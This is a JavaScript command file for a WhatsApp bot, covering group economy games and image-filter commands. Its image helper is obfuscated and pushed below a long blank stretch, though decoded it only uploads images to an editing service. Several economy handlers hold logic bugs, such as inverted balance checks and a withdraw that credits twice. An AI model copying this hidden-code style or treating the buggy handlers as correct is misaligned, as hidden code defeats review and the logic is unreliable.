   let zerogroup = (await sck.findOne({ id: citel.chat,})) || (await new sck({id: citel.chat,}).save());
   let mongoschemas = zerogroup.economy || "false";
   if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
   if(!isCreator) return citel.reply(tlang().owner)
   let users = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
   if(!users) return citel.reply('Please give me user.')
   const balance  = await eco.balance(users, "secktor")
   await eco.deduct(users, "secktor", balance.wallet);
   return await citel.reply(`⛩️ User: @${users.split('@')[0]} \n *🧧 @${users.split('@')[0]} lost all 🪙 in wallet.*\n_Now live with that poverty.🫡_`,{mentions:[users]})
}
)
//---------------------------------------------------------------------------
cmd({
pattern: "capacity",
desc: "update capacity.",
category: "economy",
filename: __filename,
react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
let zerogroup = (await sck.findOne({ id: citel.chat, })) || (await new sck({  id: citel.chat,  }).save());
let mongoschemas = zerogroup.economy || "false";
if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
if (!citel.isGroup) return citel.reply(tlang().group);
if (!text) return citel.reply(`💴 *Bank-capacity* 💳\n\n1 | *1000 sp* = 🪙100\n\n2 | *100000 sp* = 🪙1000\n\n3 | *10000000 sp* = 🪙10000000\n\nExample- ${prefix}capacity 1 OR ${prefix}bankupgrade 1000`)
let user = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
const secktor = "secktor"
let value = text.trim();
let k = parseInt(value)
const balance  = await eco.balance(user, secktor)
switch (value) {
   case '1000':
   case '1':
   if (k > balance.wallet ) return citel.reply(`*_You need to pay 🪙100 to increase bank capacity ~ 1000 sp_*`);
     const deduct1 = await eco.deduct(user, secktor, 100);
     const add1 = eco.giveCapacity(user, secktor, 1000);
     return await citel.reply(`*1000 🪙diamond storage has been added in ${citel.pushName} bank*`)
   //return await Void.sendButtonText(citel.chat, `*1000 🪙diamond storage has been added in ${citel.pushName} bank*`, `${Config.ownername.split(' ')[0]}-Economy Version: 0.0.6`, citel);

         break
   case '100000':
   case '2':
   if (k < balance.wallet) return citel.reply(`*You need to pay 🪙1000 to increase bank capacity ~ 100000 sp*`);
     const deduct2 = await eco.deduct(user, secktor, 1000);
     const add2 = eco.giveCapacity(user, secktor, 100000);
     return await citel.reply(`*100000 🪙diamond storage has been added in ${citel.pushName} bank*`)
   //return await Void.sendButtonText(citel.chat,  `*100000 🪙diamond storage has been added in ${citel.pushName} bank*`, `${Config.ownername.split(' ')[0]}-Economy Version: 0.0.6`, citel);


         break
   case '10000000':
   case '3':
   if (k < balance.wallet) return citel.reply(`You need to pay 🪙10000 to increase bank capacity ~ 1000 sp`);
      const deduct3 = await eco.deduct(user, secktor, 10000);
      const add3 = eco.giveCapacity(user, secktor, 10000000);
      return await citel.reply(`*10000000 🪙diamond storage has been added in ${citel.pushName}\'s bank*`)
  // return await Void.sendButtonText(citel.chat,  `*10000000 🪙diamond storage has been added in ${citel.pushName}\'s bank*`, `${Config.ownername.split(' ')[0]}-Economy Version: 0.0.6`, citel);


        break
default:
await citel.reply('*What are you trying to do📉*.')

}
}
)

//---------------------------------------------------------------------------
cmd({
   pattern: "deposit",
   desc: "deposit gold.",
   category: "economy",
   filename: __filename,
   react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
   let zerogroup = (await sck.findOne({ id: citel.chat,  })) || (await new sck({  id: citel.chat, }) .save());
   let mongoschemas = zerogroup.economy || "false";
   if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
 //  let users = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
   if (!text) return citel.reply("Baka!! Provide the 💰amount you want to deposit!");
   let d = parseInt(text)
   const deposit = await eco.deposit(citel.sender, "secktor", d);
   const balance = await eco.balance(citel.sender, "secktor")
   if(deposit.noten) return citel.reply('You can\'t deposit what you don\'t have💰.'); //if user states more than whats in his wallet
   return await citel.reply(`⛩️ Sender: ${citel.pushName}\n🍀Successfully 💰Deposited 🪙${deposit.amount} to your bank.Upgrade your bank capacity to add more money📈.`)
//return await Void.sendButtonText(citel.chat,  `⛩️ Sender: ${citel.pushName}\n🍀Successfully 💰Deposited 🪙${deposit.amount} to your bank.Upgrade your bank capacity to add more money📈.`, `${Config.ownername.split(' ')[0]}-Economy Version: 0.0.6`, citel);
}
)
cmd({
   pattern: "lb",
   desc: "check leaderboard.",
   category: "economy",
   filename: __filename,
   react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
let h = await eco.lb('secktor',10);
let str = `*Top ${h.length} users with more money in wallet.*\n`
const { sck1 } = require('../lib');
let arr = []
for(let i=0;i<h.length;i++){
       let username = await sck1.findOne({ id: h[i].userID })
       var tname;
       if (username.name && username.name !== undefined) {
           tname = username.name
       } else {
           tname = Void.getName(h[i].userID)
       }
str+= `*${i+1}*\n╭─────────────◆\n│ *Name:-* _${tname}_\n│ *User:-* _@${h[i].userID.split('@')[0]}_\n│ *Wallet:-* _${h[i].wallet}_\n│ *Bank Amount:-* _${h[i].bank}_\n│ *Bank Capacity:-* _${h[i].bankCapacity}_\n╰─────────────◆\n\n`  	 
arr.push(h[i].userID)
}
    citel.reply(str,{mentions:arr})
    
})

cmd({
pattern: "transfer",
desc: "transfer gold.",
category: "economy",
filename: __filename,
react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
let zerogroup = (await sck.findOne({  id: citel.chat, })) || (await new sck({   id: citel.chat,   })  .save());
let mongoschemas = zerogroup.economy || "false";
if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
let value = text.trim().split(" ");
if (value[0] === "") return citel.reply(`Use ${prefix}transfer 100 @user`);
let user = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
if(!user) return citel.reply('Please give me any user🤦‍♂️.');
const secktor = "secktor"
   const user1 = citel.sender
   const user2 = user
   const word = value[0];
   const code = value[1];
   let d = parseInt(word)
   if (!d) return citel.reply("check your text plz u r using the command in a wrong way👀");
   const balance = await eco.balance(user1, secktor);
   let a = (balance.wallet) < parseInt(word)
   //Returns wallet, bank, and bankCapacity. Also creates a USer if it doesn't exist.
   if(a == true) return citel.reply("you dont have sufficient money to transfer👎");

   const deduct = await eco.deduct(user1, secktor, value[0]);
   const give = await eco.give(user2, secktor, value[0]);
   return await citel.reply(`*📠 Transaction successful of ${value[0]} 💰*`)
// return await Void.sendButtonText(citel.chat, `*📠 Transaction successful of ${value[0]} 💰*`, `${Config.ownername.split(' ')[0]}-Economy Version: 0.0.6`, citel);


}
)

//---------------------------------------------------------------------------
cmd({
   pattern: "wallet",
   desc: "shows wallet.",
   category: "economy",
   filename: __filename,
   react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
   let zerogroup = (await sck.findOne({
       id: citel.chat,
   })) || (await new sck({
           id: citel.chat,
       })
       .save());
   let mongoschemas = zerogroup.economy || "false";
   if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
    const secktor = "secktor"
    const balance = await eco.balance(citel.sender, secktor); //Returns wallet, bank, and bankCapacity. Also creates a USer if it doesn't exist.
    return await citel.reply(`*👛 ${citel.pushName}'s Purse:*\n\n_🪙${balance.wallet}_`)
//return await Void.sendButtonText(citel.chat, `*👛 ${citel.pushName}'s Purse:*\n\n_🪙${balance.wallet}_`, `${Config.ownername.split(' ')[0]}-Economy Version: 0.0.6`, citel);

}
)

//---------------------------------------------------------------------------
cmd({
   pattern: "give",
   desc: "Add money in wallet.",
   category: "economy",
   filename: __filename,
   react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
   if(!isCreator) return

    const secktor = "secktor"
    let users = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
    if(!users) return citel.reply('Please give me user to add money.')
    await eco.give(users, secktor, parseInt(text.split(' ')[0]));
   return await Void.sendMessage(citel.chat,{text: `Added 📈 ${parseInt(text.split(' ')[0])} to @${users.split('@')[0]} wallet🛸.`,mentions:[users]},{quoted:citel})

}
)

//---------------------------------------------------------------------------
cmd({
   pattern: "bank",
   desc: "shows bank amount.",
   category: "economy",
   filename: __filename,
   react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
   let zerogroup = (await sck.findOne({  id: citel.chat,  })) || (await new sck({   id: citel.chat,   }) .save());
   let mongoschemas = zerogroup.economy || "false";
   if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
   const balance = await eco.balance(citel.sender, "secktor"); //Returns wallet, bank, and bankCapacity. Also creates a USer if it doesn't exist.
   return await citel.reply(`🍀User: ${citel.pushName}\n\n_🪙${balance.bank}/${balance.bankCapacity}_`)
//return await Void.sendButtonText(citel.chat, `🍀User: ${citel.pushName}\n\n_🪙${balance.bank}/${balance.bankCapacity}_`, `${Config.ownername.split(' ')[0]}-Economy \n Version: 0.0.6`, citel);

}
)

//---------------------------------------------------------------------------
cmd({
   pattern: "rob",
   desc: "rob bank amount.",
   category: "economy",
   filename: __filename,
},
async(Void, citel, text,{ isCreator }) => {
   let zerogroup = (await sck.findOne({   id: citel.chat,  })) || (await new sck({  id: citel.chat,   })  .save());
   let mongoschemas = zerogroup.economy || "false";
   if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
   let users = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
if(!users) return citel.reply('Please give me user to rob.')
   const user1 = citel.sender
   const user2 = users
const secktor = "secktor"
   const k = 1000
   const balance1  = await eco.balance(user1, secktor)
const balance2  = await eco.balance(user2, secktor)
const typ = ['ran','rob','caught'];
const random = typ[Math.floor(Math.random() * typ.length)];
if (k > balance1.wallet) return citel.reply(`*☹️ You don't have enough money to pay incase you get caught*`);
if (k > balance2.wallet) return citel.reply(`*Sorry, your victim is too poor 🤷🏽‍♂️ let go🫤.*`);
let tpy = random    
switch (random) {
  
   case 'ran':
         await citel.reply(`*Your victim escaped, be more scary next time🫰.*`)
         ////citel.react('🥹')

         break
   case 'rob':
 const deduff = Math.floor(Math.random() * 1000)	    
     await eco.deduct(user2, secktor, deduff);
     await eco.give(citel.sender, secktor, deduff);
     await citel.reply(`*🤑 Robbery operation done successfully.🗡️*\nYou ran with ${deduff} amount in your wallet.`)
     ////citel.react('💀')
         break
   case 'caught':
      const rmoney = Math.floor(Math.random() * 1000)
      await eco.deduct(user1, secktor, rmoney);
      await citel.reply(`*Sorry FBI👮 caught up with you, you paid ${rmoney} 🪙 from wallet🥹.*`)
      ////citel.react('😦')
        break
default:
await citel.reply('*What are you trying to do👀*.')
//citel.react('🤔')

}

}
)

//---------------------------------------------------------------------------
cmd({
   pattern: "withdraw",
   desc: "withdraw money from bank account.",
   category: "economy",
   filename: __filename,
   react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
   let zerogroup = (await sck.findOne({   id: citel.chat,  })) || (await new sck({  id: citel.chat,   }).save());
   let mongoschemas = zerogroup.economy || "false";
   if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
   const user = citel.sender
   if (!text) return citel.reply("*Provide the amount💰 you want to withdraw💳!*");
   const query = text.trim();
   const secktor = "secktor"
   const withdraw = await eco.withdraw(user, secktor, query);
   if(withdraw.noten) return citel.reply('*🏧 Insufficient fund in bank🫤*'); //if user states more than whats in his wallet
   const add = eco.give(user, secktor, query);
   citel.reply(`*🏧 ALERT* \n _🪙${withdraw.amount} has been withdrawn from your wallet💰._`)
}
)

//---------------------------------------------------------------------------
cmd({
   pattern: "gamble",
   desc: "gamble money.",
   category: "economy",
   filename: __filename,
   react: "💷"
}, 
async(Void, citel, text,{ isCreator }) => {
   let zerogroup = (await sck.findOne({ id: citel.chat,})) || (await new sck({ id: citel.chat, }).save());
   let mongoschemas = zerogroup.economy || "false";
   if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
   const user = citel.sender
//	if(citel.chat!=="120363043857093839@g.us") return citel.reply('This is not a economy group.')
   var texts = text.split(" ");
var opp = texts[1];// your value
var value = texts[0].toLowerCase();
var gg = parseInt(value)
///.mentionedJid[0] ? m.mentionedJid[0] : m.sender
const secktor = "secktor"
const balance = await eco.balance(user, secktor);
const g = (balance.wallet) > parseInt(value)
const k = 50
const a = (k) > parseInt(value)
const twice = gg*2
     var hjkl;
    if(opp==='left') {   hjkl = 'https://github.com/SecktorBot/Brandimages/blob/main/Nezuko/leftr.webp?raw=true'   } 
else if(opp==='right') {  hjkl = 'https://github.com/SecktorBot/Brandimages/blob/main/Nezuko/rightr.webp?raw=true'  } 
else if(opp==='up') {     hjkl = 'https://github.com/SecktorBot/Brandimages/blob/main/Nezuko/upr.webp?raw=true'     }
else if (opp==='down'){  hjkl = 'https://github.com/SecktorBot/Brandimages/blob/main/Nezuko/downr.webp?raw=true'    }
else{   citel.reply(`Please provide direction(left,right,up,down).\nEg:- ${prefix}gamble 200 left`)  }
let media = await getBuffer(hjkl)
citel.reply(media,{packname:'Secktor',author:'Economy'},"sticker")
const f = ["up", "right", "left", "down", "up", "left", "down", "right", "up", "down", "right", "left"]
const r = f[Math.floor(Math.random () * f.length)]
if (!text) return citel.reply(`Example:  ${prefix}gamble 100 direction(left,right,up,down)`);

       if (!value) return citel.reply("*Please, specify the amount you are gambling with!*");
       if (!opp) return citel.reply("*Specify the direction you are betting on!*");
       if (!gg) return citel.reply("*Check your text please, You are using the command in a wrong way*")
       if (g == false) return citel.reply(`*You don't have sufficient 🪙 Diamond to gamble with*`);
       if (a == true) return citel.reply(`*Sorry ${citel.pushName}, you can only gamble with more than 🪙50.*`);
      if ( r == opp){
      let give = await eco.give(user , secktor, twice);    //citel.react('⭐️')
      return await citel.reply(`*📈 You won 🪙${twice}*`)
//return await Void.sendButtonText(citel.chat, `*📈 You won 🪙${twice}*`, `${Config.ownername.split(' ')[0]}-Economy \n Version: 0.0.6`, citel);

   }
   else{
             let deduct = await eco.deduct(user, secktor, texts[0]);

//citel.react('🤮')
return await citel.reply(`*📉 You lost 🪙${texts[0]}*`)
//return await Void.sendButtonText(citel.chat,`*📉 You lost 🪙${texts[0]}*`, `${Config.ownername.split(' ')[0]}-Economy \n Version: 0.0.6`, citel);

    }
}
)




//---------------------------------------------------------------------------
cmd({
   pattern: "slot2",
   desc: "withdraw money from bank account.",
   category: "economy",
   filename: __filename,
   react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
   let zerogroup = (await sck.findOne({  id: citel.chat,    })) || (await new sck({  id: citel.chat, }).save());
   let mongoschemas = zerogroup.economy || "false";
   if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
   var today = new Date();
   if (today.getDay() == 6 || today.getDay() == 5 || today.getDay() == 0){
       if (text == 'help') return citel.reply(`*1:* Use ${prefix}slot to play\n\n*2:* You must have 🪙100 in your wallet\n\n*3:* If you don't have money in wallet then 👛withdraw from your bank🏦\n\n*4:* If you don't have 🤑 money in your 🏦bank too then use economy features to 📈gain money`)
       if (text == 'money') return citel.reply(`*1:* Small Win --> +🪙20\n\n*2:* Small Lose --> -🪙20\n\n*3:* Big Win --> +🪙100\n\n*4:* Big Lose --> -🪙50\n\n*5:* 🎉 JackPot --> +🪙1000`)
       const fruit1= ["🥥", "🍎", "🍇"]
       const fruit2 = ["🍎", "🍇", "🥥"]
       const fruit3 = ["🍇", "🥥", "🍎"]
       const fruit4 = "🍇"
       const lose = ['*You suck at playing this game*\n\n_--> 🍍-🥥-🍎_', '*Totally out of line*\n\n_--> 🥥-🍎-🍍_', '*Are you a newbie?*\n\n_--> 🍎-🍍-🥥_']
       const smallLose = ['*You cannot harvest coconut 🥥 in a pineapple 🍍 farm*\n\n_--> 🍍>🥥<🍍_', '*Apples and Coconut are not best Combo*\n\n_--> 🍎>🥥<🍎_', '*Coconuts and Apple are not great deal*\n\n_--> 🥥>🍎<🥥_']
       const won = ['*You harvested a basket of*\n\n_--> 🍎+🍎+🍎_', '*Impressive, You must be a specialist in plucking coconuts*\n\n_--> 🥥+🥥+🥥_', '*Amazing, you are going to be making pineapple juice for the family*\n\n_--> 🍍+🍍+🍍_']
       const near = ['*Wow, you were so close to winning pineapples*\n\n_--> 🍎-🍍+🍍_', '*Hmmm, you were so close to winning Apples*\n\n_--> 🍎+🍎-🍍_']
       const jack = ['*🥳 JackPot 🤑*\n\n_--> 🍇×🍇×🍇×🍇_', '*🎉 JaaackPooot!*\n\n_--> 🥥×🥥×🥥×🥥_', '*🎊 You Just hit a jackpot worth 🪙1000*']
       const user = citel.sender
       const secktor = "secktor"
       const k = 100
       const balance1  = await eco.balance(user, secktor)
       if (k > balance1.wallet) return citel.reply(`You are going to be spinning on your wallet, you need at least 🪙100`);
       const f1 = fruit1[Math.floor(Math.random() * fruit1.length)];
       const f2 = fruit2[Math.floor(Math.random() * fruit2.length)];
       const f3 = fruit3[Math.floor(Math.random() * fruit3.length)];
       //const f4 = fruit4[Math.floor(Math.random() * fruit4.length)];
       const mess1 = lose[Math.floor(Math.random() * lose.length)];
       const mess2 = won[Math.floor(Math.random() * won.length)];
       const mess3 = near[Math.floor(Math.random() * near.length)];
       const mess4 = jack[Math.floor(Math.random() * jack.length)];
       const mess5 = smallLose[Math.floor(Math.random() * smallLose.length)];
       if(text.split(' ')[0]){
let value = text.split(' ')[0]
const balance = await eco.balance(citel.sender, secktor)
console.log(balance.wallet)
if(value<=balance.wallet){
const deduff = Math.floor(Math.random() * value)
if ((f1 !== f2) && f2 !== f3){
   const deduct1 = await eco.deduct(user, secktor, deduff);
   return citel.reply(`${mess1}\n\n*Big Lose -->* _🪙${deduff}_`)
}
else if ((f1 == f2) && f2 == f3){
   const give1 = await eco.give(user, secktor, deduff/2);
   return citel.reply(`${mess2}\n*_Little Jackpot -->* _🪙${deduff/2}_`)
}
else if ((f1 == f2) && f2 !== f3){
   const give2 = await eco.give(user, secktor, deduff);
   return citel.reply(`${mess3}\n*Small Win -->* _🪙${deduff}_`)
}
else if ((f1 !== f2) && f1 == f3){
   const deduct2 = await eco.deduct(user, secktor, deduff);
   return citel.reply(`${mess5}\n\n*Small Lose -->* _🪙${deduff}_`)
}
else if ((f1 !== f2) && f2 == f3){
   const give4 = eco.give(user, secktor, deduff);
   return citel.reply(`${mess3}\n\n*Small Win -->* _🪙${deduff}_`)
}
else if ((f1 == f2) && (f2 == f3) && (f3 == f4)){
   const give5 = eco.give(user, secktor, deduff*20);
   return citel.reply(`${mess4}\n\n_🎊 JackPot --> _🪙${deduff*20}_`)
}
else {
   return citel.reply(`Do you understand what you are doing?`)
}

} else{
return citel.reply('You don\'t have enough 💰amount in your👛 wallet.\n- Please don\'t provide 🤑amount.')
}
       }
       if ((f1 !== f2) && f2 !== f3){
          const deduct1 = await eco.deduct(user, secktor, 50);
                 citel.reply(`${mess1}\n\n*Big Lose -->* _🪙50_`)
       }
       else if ((f1 == f2) && f2 == f3){
          const give1 = await eco.give(user, secktor, 100);
                citel.reply(`${mess2}\n*_Little Jackpot -->* _🪙100_`)
       }
       else if ((f1 == f2) && f2 !== f3){
          const give2 = await eco.give(user, secktor, 20);
                citel.reply(`${mess3}\n*Small Win -->* _🪙20_`)
       }
       else if ((f1 !== f2) && f1 == f3){
          const deduct2 = await eco.deduct(user, secktor, 20);
                citel.reply(`${mess5}\n\n*Small Lose -->* _🪙20_`)
       }
       else if ((f1 !== f2) && f2 == f3){
          const give4 = eco.give(user, secktor, 20);
                citel.reply(`${mess3}\n\n*Small Win -->* _🪙20_`)
       }
       else if ((f1 == f2) && (f2 == f3) && (f3 == f4)){
          const give5 = eco.give(user, secktor, 1000);
               citel.reply(`${mess4}\n\n_🎊 JackPot --> _🪙1000_`)
       }
       else {  citel.reply(`Do you understand what you are doing?`)        }
    }
    else{  citel.reply(`*You can only play this game during weekends*\n\n*🌿 Friday*\n*🎏 Saturday*\n*🎐 Sunday*`)  }
}
)

cmd({
pattern: "slot",
desc: "slot game.",
category: "economy",
filename: __filename,
react: "💷"
},
async(Void, citel, text,{ isCreator }) => {
let zerogroup = (await sck.findOne({ id: citel.chat, })) || (await new sck({ id: citel.chat,}).save());
let mongoschemas = zerogroup.economy || "false";
if (mongoschemas == "false") return citel.reply("*🚦Economy* is not active in current group.");
const kg = 100
       const balance1  = await eco.balance(citel.sender, "secktor")
       if (kg > balance1.wallet) return citel.reply(`You are going to be spinning on your wallet, you need at least 🪙100`);
var r_ban = new Array ();
r_ban[0] =    "1 : 2 : 3"
r_ban[1] = "1 : 2 : 3"
r_ban[2] = "1 : 2 : 3"
r_ban[3] = "4 : 3 : 3"
r_ban[4] = "1 : 1 : 1"
r_ban[5] = "5 : 2 : 5"
r_ban[6] = "3 : 5 : 3"
r_ban[7] = "1 : 3 : 6"
r_ban[8] = "6 : 2 : 7"
r_ban[9] = "1 : 6 : 3"
r_ban[10]= "6 : 3 : 2"
r_ban[11]= "5 : 5 : 6"
r_ban[12]= "1 : 5 : 3"
r_ban[13]= "4 : 1 : 7"
r_ban[14]= "4 : 3 : 2"
r_ban[15]= "4 : 3 : 2"
r_ban[16]= "7 : 4 : 6"
r_ban[17]= "6 : 5 : 1"
r_ban[18]= "5 : 7 : 2"


var p = Math.floor(19*Math.random())
var q = Math.floor(19*Math.random())
var r = Math.floor(19*Math.random())
var i = (r_ban[p]);
var j = (r_ban[q]);
var k = (r_ban[r]);
console.log(i+'\n'+j+'\n'+k)
let t = i.split(':');
let tt = j.split(':');
let ttt = k.split(':');
var lol;
if(t[2]===tt[1] && tt[1]===ttt[0]) lol = true
if(t[0]===tt[1] && tt[1]===ttt[2]) lol = true
if(t[0]===tt[0] && tt[0]===ttt[0]) lol = true
if(t[1]===tt[1] && tt[1]===ttt[1]) lol = true
if(t[2]===tt[2] && tt[2] ===ttt[2]) lol = true
if(t[0]===tt[1] && tt[1]===ttt[2]) lol = true
if(t[2]===tt[1] && tt[1]===ttt[0]) lol = true
if(t[0]===t[1] && t[0]===t[2]) lol = true
if(tt[0]===tt[1] && tt[0]===tt[2]) lol = true
if(ttt[0]===ttt[1] && ttt[0]===ttt[2]) lol = true
if(t[0]===ttt[1] && t[0]===ttt[2]) lol = true
if(lol){
   const deduff = Math.floor(Math.random() * 5000)
   const give2 = await eco.give(citel.sender, "secktor", deduff*2);
   let st = `🎰 Slot Machine Result\n     ${i}\n\n     ${j}\n\n     ${k}\n\nWow Jackpot🎊.`
   let str = st.replace(/1/g, `🔴`).replace(/2/g, `🔵`).replace(/3/g, `🟣`).replace(/4/g, `🟢`).replace(/5/g, `🟡`).replace(/6/g, `⚪️`).replace(/7/g, `⚫️`).replace(/:/g, `  `)

   return await citel.reply(`You got ${deduff*10} in your wallet.`)
// return await Void.sendButtonText(citel.chat,str+`You got ${deduff*10} in your wallet.`, `${Config.ownername.split(' ')[0]}-Economy \n Version: 0.0.6`, citel);

} else {
const deduff = Math.floor(Math.random() * 300)
const deduct1 = await eco.deduct(citel.sender, "secktor", deduff);
let st = `\n🎰 Slot Machine Result\n     ${i}\n\n      ${j}\n\n      ${k}\n\nNot Jacpot📉 but lost `
       let str = st.replace(/1/g, `🔴`).replace(/2/g, `🔵`).replace(/3/g, `🟣`).replace(/4/g, `🟢`).replace(/5/g, `🟡`).replace(/6/g, `⚪️`).replace(/7/g, `⚫️`).replace(/:/g, `    `)
       return await citel.reply(str+` ${deduff}.`)
//return await Void.sendButtonText(citel.chat,str+` ${deduff}.`, `${Config.ownername.split(' ')[0]}-Economy \n Version: 0.0.6`, citel);
}
}
) 







































































































































































































































async function Create_Url(Void, citel, name = 'ad' )
{
const _0x1dace8=_0x367a;function _0x26f1(){const _0xc64de5=['13444AIecxl','*_Error\x20While\x20Editing\x20Image_*\x0a*_Error\x20Reason\x20:_*\x20','decodeJid','73960soGYOX','1575683OEYqHN','downloadAndSaveMediaMessage','441OEclfF','2919707oQNBfX','2013754aJnIXK','1431KTrARE','chat','https://api.popcat.xyz/','log','414405PoGxef','102nAAbWk','sendMessage','caption','25900960cLaQwa','user'];_0x26f1=function(){return _0xc64de5;};return _0x26f1();}(function(_0x329471,_0x5242ae){const _0x5c4371=_0x367a,_0x3e57c8=_0x329471();while(!![]){try{const _0x5ee4e5=-parseInt(_0x5c4371(0x1ae))/0x1+-parseInt(_0x5c4371(0x1b2))/0x2+-parseInt(_0x5c4371(0x1b0))/0x3*(-parseInt(_0x5c4371(0x1aa))/0x4)+parseInt(_0x5c4371(0x1b7))/0x5*(parseInt(_0x5c4371(0x1b8))/0x6)+parseInt(_0x5c4371(0x1b1))/0x7+-parseInt(_0x5c4371(0x1ad))/0x8*(parseInt(_0x5c4371(0x1b3))/0x9)+parseInt(_0x5c4371(0x1bb))/0xa;if(_0x5ee4e5===_0x5242ae)break;else _0x3e57c8['push'](_0x3e57c8['shift']());}catch(_0xc85b5d){_0x3e57c8['push'](_0x3e57c8['shift']());}}}(_0x26f1,0xd167e));function _0x367a(_0x360a35,_0x1b3585){const _0x26f1a0=_0x26f1();return _0x367a=function(_0x367ac4,_0x26bfaf){_0x367ac4=_0x367ac4-0x1a9;let _0x294bf7=_0x26f1a0[_0x367ac4];return _0x294bf7;},_0x367a(_0x360a35,_0x1b3585);}try{let media=await Void[_0x1dace8(0x1af)](citel['quoted']),sᴜʜᴀɪʟ_ᴍᴅ=await TelegraPh(media);try{await fs['unlinkSync'](media);}catch(_0x5c9f39){}return await Void[_0x1dace8(0x1b9)](citel[_0x1dace8(0x1b4)],{'image':{'url':_0x1dace8(0x1b5)+name+'?image='+sᴜʜᴀɪʟ_ᴍᴅ},'caption':Config[_0x1dace8(0x1ba)]},{'quoted':citel});}catch(_0x4b7516){console[_0x1dace8(0x1b6)](_0x4b7516);const botNumber=await Void[_0x1dace8(0x1ac)](Void[_0x1dace8(0x1a9)]['id']);return await Void[_0x1dace8(0x1b9)](botNumber,{'text':_0x1dace8(0x1ab)+_0x4b7516},{'quoted':citel});}

} 
cmd({ pattern: "ad", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text , { cmdName,args, isCreator, body, budy }) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image* ${this.cmd}`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'ad'); 
})
//=============================================================================
cmd({ pattern: "jail", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image*`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'jail'); 
})
//=============================================================================
cmd({ pattern: "uncover", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image*`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'uncover'); 
})
//=============================================================================
cmd({ pattern: "clown", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image*`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'clown'); 
})
//=============================================================================
cmd({ pattern: "mnm", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image*`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'mnm'); 
})
//=============================================================================
cmd({ pattern: "pett", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image*`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'pet'); 
})
//=============================================================================
cmd({ pattern: "greyscale", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image*`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'greyscale'); 
})
//=============================================================================
cmd({ pattern: "invert", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image*`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'invert'); 
})
//=============================================================================
cmd({ pattern: "blur", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image*`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'blur'); 
})
//============================================================================
cmd({ pattern: "drip", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image*`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'drip'); 
})
//=============================================================================
cmd({ pattern: "colorify", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image*`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'colorify'); 
})
//=============================================================================
cmd({ pattern: "gun", category: "editor", filename: __filename,  desc: "pic Editor."},
async(Void, citel, text) => {
    if (!citel.quoted) return await citel.reply(`*Reply To Any Image*`);
    if(citel.quoted.mtype !='imageMessage') return await citel.reply("Uhh Please, Reply To An Image");
    await Create_Url(Void, citel , 'gun'); 
